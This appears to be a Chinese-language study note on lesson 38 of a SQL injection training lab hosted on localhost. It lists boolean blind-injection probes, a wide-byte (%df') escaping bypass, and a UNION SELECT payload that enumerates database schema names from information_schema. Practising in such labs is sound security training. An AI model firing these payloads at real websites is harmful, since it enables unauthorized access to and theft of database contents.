# Lesson-38
```
Bool盲注-,-宽字节绕过
```

盲注证明 : 
```
http://127.0.0.1/Less-38/?id=0%df'|(1)--+
http://127.0.0.1/Less-38/?id=0%df'|(1)--+
```
> 后记 : 
证明盲注
`?id='|'1`
`?id='|'0`

---
明注 : 
```
http://127.0.0.1/Less-38/?id=0%df%27%20union%20select%201,1,1--+
```
还是利用宽字节可以成功绕过
```
http://127.0.0.1/Less-38/?id=0%df%27%20union%20select%201,1,group_concat(schema_name)%20from%20information_schema.schemata--+
```
> 后记 : 
感觉好多题目都被我水过去了 , 好多题目都是通杀的Payload , 没有领会到题目的本意 , 以后一定重新做
